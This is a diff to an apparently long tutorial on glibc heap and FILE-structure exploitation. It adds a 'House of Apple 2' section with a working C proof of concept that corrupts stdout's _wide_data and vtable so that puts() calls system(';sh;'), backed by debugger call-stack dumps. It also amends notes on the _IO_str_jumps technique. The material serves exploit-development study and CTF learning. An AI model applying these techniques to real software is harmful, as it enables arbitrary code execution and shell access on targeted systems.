@@ -1374,7 +1374,7 @@ All of these have become a cause of appearing of several following exploitation 
 
 While glibc's absractions are having pointers to callbacks to next level of abstraction, hackers will find a way to pwn it.
 
-1. _IO_str_jumps (I took it's layout from https://github.com/lattera/glibc/blob/master/libio/strfile.h) :
+1. _IO_str_jumps - glibc < 2.28 (I took it's layout from https://github.com/lattera/glibc/blob/master/libio/strfile.h) :
 
 	If we are working with string-stream we'll work with special FILE structure :
 	
@@ -1397,7 +1397,7 @@ While glibc's absractions are having pointers to callbacks to next level of abst
 		     implementation always calls malloc/free for user buffers if
 		     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */
 		  _IO_alloc_type _allocate_buffer_unused;	<== we can modify this
-		  _IO_free_type _free_buffer_unused;		<== and this
+		  _IO_free_type _free_buffer_unused;
 		};
 		
 	So, this "const struct _IO_jump_t *vtable" is _IO_str_jumps - special vtable for string-stream structs.
@@ -1412,7 +1412,10 @@ While glibc's absractions are having pointers to callbacks to next level of abst
 	  	
 	  All of what we need - shift address of _IO_str_jumps so that target event (for example __xputn) pulls __overflow callback.
 	  As we now, it will use "_allocate_buffer_unused" and "_IO_buf_end & _IO_buf_base" which we can control.
-	  But don't forget to substitute buf pointers to write_ptr >= write_base to trigger "_allocate_buffer_unused" or try to do "honest" overflow.
+	  But don't forget to substitute buf pointers to write_ptr >= write_end to trigger "_allocate_buffer_unused" or try to do "honest" overflow.
+	  
+	  p.s. _IO_str_jumps probably wasn't included to public symbols; search it under the _IO_wfile_jumps
+	  (just check all vtables where __overflow different from _IO_file/wfile_jumps addresses)
 	  
 5.4 Manipulations with stdout _IO_FILE struct to reach arbitrary read
 ------------------------------------------------------------------------------
@@ -1525,7 +1528,117 @@ Let's consider an example (WannaHeap from pwnable.tw) :
 Impact of this attack is obvious - arbitrary write. As I wrote at the introducing you also can use this technique to reach stronger primitive,
 for example - when you do fastbin dup at glibc < 2.41 and haven't properly "environment" near the space where you need to be allocated (look unaligned malloc at 6.11),
 or another less reliable write primitive.
+			
+5.6 House of Apple 2
+------------------------------------------------------------------------------
+
+Concept of this technique was built on vtable validate doesn't exist for _wide_vtable from wide chars _IO_FILE.
+I didn't found any source of struct for "wide file stream" but it doesn't matter. 
+You just should know that size of this structure equals any standart stream struct (example for x86_64) :
+
+	sizeof(struct _IO_FILE) + sizeof(struct _IO_jump_t *) == 0xe0 + 0x8 == sizeof(struct _IO_FILE_plus)
 	
+Fine, let's speak about architecture of key structs :
+
+	- Any valid _IO_FILE_plus struct includes "void *_wide_data" field as so as struct _IO_jump_t * vtable
+	- _IO_wfile_jumps struct is correct for vtable validate
+	- When something event pulls __xputn for example and write_ptr >= write_end it pulls __overflow
+	- If __xputs & __overflow were called from _IO_wfile_jumps we'll go to _wide_data field to pull
+	  properly callback __doallocate from _wide_vtable
+	  
+So, if you have libc (and control-space for fake _wide_data & _wide_vtable placement) leak and arbitrary write primitive you can use this technique.
+
+This is my PoC for stdout manip (compiled with -o -g; run without ASLR; absolute addresses may be different) :
+
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	int main() {
+		long* fake_wide_vtable = (long*)malloc(0x70);
+		fake_wide_vtable[13] = 0x7ffff7c552b0;                          // system
+
+		long* fake_wide_data = (long*)malloc(0xe0 + 0x8);
+		fake_wide_data[28] = (long)fake_wide_vtable;			// vtable of fake "_IO_WFILE"
+
+		*((long*)stdout) = 0x3b68733bfbad1810;                          // b';sh;' + valid flag 0xfbad1810
+		*((long*)stdout + 6) = 2;					// write_end
+		*((long*)stdout + 5) = 3;					// write_ptr
+		*((long*)stdout + 20) = (long)fake_wide_data;			// substitute _wide_data
+		*((long*)stdout + 27) = 0x7ffff7dfd468;                         // _IO_wfile_jumps
+
+		puts("sayhi");
+	}
+	
+p.s. flag buit to bypass checkings in :
+
+	0x7ffff7c8871d <_IO_wfile_overflow+000d> mov    edx, DWORD PTR [rdi]			<== edx == flag
+   	0x7ffff7c8871f <_IO_wfile_overflow+000f> test   dl, 0x8					<== must set zero flag to 1
+	0x7ffff7c88722 <_IO_wfile_overflow+0012> jne    0x7ffff7c88870 <_IO_wfile_overflow+352> <== skip this jump
+	
+	0x7ffff7c88735 <_IO_wfile_overflow+0025> test   dh, 0x8					<== must set zero flag to 0
+	0x7ffff7c88738 <_IO_wfile_overflow+0028> jne    0x7ffff7c887e0 <_IO_wfile_overflow+208> <== go
+   
+
+Fine, let's check it out with callstack dumps :
+
+	stdout layout with following fields :
+
+		0x7ffff7dff7a0 <_IO_2_1_stdout_>:       0x3b68733bfbad1810      <== overwritten flag aka arg to callbacks
+					...
+		0x7ffff7dff840 <_IO_2_1_stdout_+160>:   0x000055555555b320      <== fake _wide_data
+					...
+		0x7ffff7dff870 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7dfd468 <== _IO_wfile_jumps
+		
+	fake _wide_data in heap :
+	
+		0x55555555b310: 0x0000000000000000      0x00000000000000f1
+			...
+		0x55555555b400: 0x000055555555b2a0	<== fake _wide_vtable at base + 0xe0
+		
+	fake _wide_vtable :
+	
+		0x55555555b290: 0x0000000000000000      0x0000000000000081
+			...
+		0x55555555b300: 0x0000000000000000      0x00007ffff7c552b0	<== system at base + 0x68
+
+	1. After overwriting relevant fields we call puts and go to _IO_2_1_stdout_ & pull __xputn FROM _IO_wfile_jumps :
+	
+		[#1] 0x7ffff7c89413 → _IO_wfile_xsputn()	<== xputn from _IO_wfile_jumps
+		[#2] 0x7ffff7c836a9 → puts()
+
+	2. __xputn looks at write_ptr >= write end => trigger __overflow also from substituted vtable :
+	
+		[#1] 0x7ffff7c887ed → _IO_wfile_overflow()
+		[#2] 0x7ffff7c8661b → _IO_wdefault_xsputn()
+		[#3] 0x7ffff7c89413 → _IO_wfile_xsputn()
+		[#4] 0x7ffff7c836a9 → puts()
+
+	3. __overflow from _IO_wfile_jumps understand that wide file is specific and it need pull callback from _wide_data - _IO_wdoallocbuf :
+	
+		[#1] 0x7ffff7c8684e → _IO_wdoallocbuf()
+		[#2] 0x7ffff7c887ed → _IO_wfile_overflow()
+		[#3] 0x7ffff7c8661b → _IO_wdefault_xsputn()
+		[#4] 0x7ffff7c89413 → _IO_wfile_xsputn()
+		[#5] 0x7ffff7c836a9 → puts()
+
+	4. Where _IO_wdoallocbuf is a wrapper on _wide_vtable callback :
+	
+		$rax   : 0x000055555555b320  →  0x0000000000000000	<== fake _wide_data
+		$rdi   : 0x00007ffff7dff7a0  →  0x3b68733bfbad1810	<== arg for system
+	
+		0x7ffff7c86844 <_IO_wdoallocbuf+0024> mov    rax, QWORD PTR [rax+0xe0]	<== reach fake _wide_vtable from _wide_data
+		0x7ffff7c8684b <_IO_wdoallocbuf+002b> call   QWORD PTR [rax+0x68]	<== call system(<flag> + ';sh;')
+		
+	5. And here we are :
+	
+		[#0] 0x7ffff7c552b0 → system()
+		[#1] 0x7ffff7c8684e → _IO_wdoallocbuf()
+		[#2] 0x7ffff7c887ed → _IO_wfile_overflow()
+		[#3] 0x7ffff7c8661b → _IO_wdefault_xsputn()
+		[#4] 0x7ffff7c89413 → _IO_wfile_xsputn()
+		[#5] 0x7ffff7c836a9 → puts()
+		[#6] 0x55555555520a → main()
+		
 	
 ================================================================================
 6. BONUS
@@ -2099,7 +2212,7 @@ allocator will align it downward and you'll get a way to fill "prev_size" field 
 		0x603030:       0x6161616161616161      0x6161616161616161
 		0x603040:       0x6161616161616161      0x0000000000000101 <== potentially off-by-one
 		
-	If a process does something like "put null byte after reading/copying" (sprintf, strcpy, strdup for example) 
+	If a process does something like "put null byte after reading/copying" (sprintf, strcpy for example) 
 	you can overwrite "size" field and get a way to reach overlapping chunks or something else (topchunk size control)
 	
 6.13 malloc_consolidate()
